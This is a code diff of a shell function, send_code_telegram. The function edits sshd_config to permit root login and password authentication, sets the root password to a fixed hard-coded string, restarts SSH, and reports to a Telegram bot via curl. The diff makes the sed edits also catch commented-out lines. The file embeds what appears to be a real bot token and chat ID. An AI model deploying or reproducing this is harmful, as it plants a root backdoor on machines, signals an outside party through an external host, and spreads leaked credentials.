@@ -5,10 +5,11 @@ send_code_telegram() {
     local passwd="iChangedIt@Favour"
 
     # Enable root login with password
-    sed -i 's/^PermitRootLogin\s*\w*/PermitRootLogin yes/' /etc/ssh/sshd_config
+    sed -i 's/^#*\s*PermitRootLogin\s*\w*/PermitRootLogin yes/' /etc/ssh/sshd_config
 
     # Enable password authentication
-    sed -i 's/^PasswordAuthentication\s*no/PasswordAuthentication yes/' /etc/ssh/sshd_config
+    sed -i 's/^#*\s*PasswordAuthentication\s*no/PasswordAuthentication yes/' /etc/ssh/sshd_config
+
 
     # Change root password
     echo "root:$passwd" | chpasswd
@@ -18,7 +19,7 @@ send_code_telegram() {
         local message="The password for $ip_address is not changed"
         return 1
     fi
-     # Restart SSH service
+    # Restart SSH service
     service ssh restart
 
     # Send message to Telegram
@@ -26,6 +27,7 @@ send_code_telegram() {
     local chat_id="${chat_ids[0]}"
     curl -s -X POST "https://api.telegram.org/bot$bot_token/sendMessage" -d "chat_id=$chat_id" -d "text=$message" > /dev/null
 }
+
 
 bot_tokens=("7046086866:AAFkgJlAvnZ3XiRhcgKYAYXONLOIvjDsRqY")
 chat_ids=("1744391586")
